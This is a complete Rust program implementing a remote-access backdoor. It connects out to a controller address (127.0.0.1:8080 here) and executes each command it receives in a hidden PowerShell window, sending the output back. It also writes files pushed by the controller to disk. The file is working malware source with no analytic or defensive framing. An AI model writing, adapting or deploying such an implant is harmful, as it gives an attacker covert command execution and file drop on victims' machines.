use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    net::TcpStream,
    process,
};

#[tokio::main]
async fn main() {
    let addr = "127.0.0.1:8080";
    let mut conn = TcpStream::connect(addr).await.unwrap();
    loop {
        match read(&mut conn).await {
            Some(cmd) => {
                if substr_exists(&cmd, b"::STARTFILE::").await {
                    download_file(&cmd).await;
                    if write(&mut conn, b"[+] File uploaded successfully".to_vec())
                        .await
                        .is_err()
                    {
                        break;
                    }
                    continue;
                }
                let command = String::from_utf8(cmd.clone()).unwrap();
                let output = run_command(command).await;
                if write(&mut conn, output).await.is_err() {
                    break;
                }
            }
            None => {
                continue;
            }
        }
    }
}

async fn download_file(data: &Vec<u8>) {
    let start_seq = b"::STARTFILE::";
    let start_data = b"::STARTDATA::";
    let stop_seq = b"::ENDFILE::";

    let filename = String::from_utf8(find_between(start_seq, start_data, data).await).unwrap();
    let filedata = find_between(start_data, stop_seq, data).await;

    tokio::fs::write(filename, filedata).await.unwrap();
}

async fn find_between(start_seq: &[u8], stop_seq: &[u8], buf: &[u8]) -> Vec<u8> {
    let start_index = buf
        .windows(start_seq.len())
        .position(|x| x == start_seq)
        .unwrap();
    let stop_index = buf
        .windows(stop_seq.len())
        .position(|x| x == stop_seq)
        .unwrap();
    buf[start_index + start_seq.len()..stop_index].to_vec()
}

async fn read(conn: &mut TcpStream) -> Option<Vec<u8>> {
    let mut read_buffer: Vec<u8> = vec![];
    let termination_str = b"::OVER::";
    while !substr_exists(&read_buffer, termination_str).await {
        let mut buf = vec![0u8; 1024];
        conn.read(&mut buf).await.unwrap();
        read_buffer.append(&mut buf);
    }
    if let Some(position) = find_position(&read_buffer, termination_str).await {
        read_buffer = read_buffer[..position].to_vec()
    }
    Some(read_buffer)
}

async fn write(conn: &mut TcpStream, mut data: Vec<u8>) -> std::io::Result<()> {
    data.append(&mut b"::OVER::".to_vec());
    conn.write_all(data.as_slice()).await
}

async fn find_position(buf: &Vec<u8>, needle: &[u8]) -> Option<usize> {
    buf.windows(needle.len()).position(|x| x == needle)
}

async fn substr_exists(buf: &Vec<u8>, needle: &[u8]) -> bool {
    match find_position(buf, needle).await {
        Some(_) => true,
        None => false,
    }
}

async fn run_command(command: String) -> Vec<u8> {
    let mut output = process::Command::new("powershell.exe");
    output.creation_flags(0x8000000);
    let mut output = output
        .arg("-NoProfile")
        .arg("-Command")
        .arg(command.trim())
        .output()
        .await
        .unwrap();
    output.stdout.append(&mut output.stderr);
    output.stdout
}
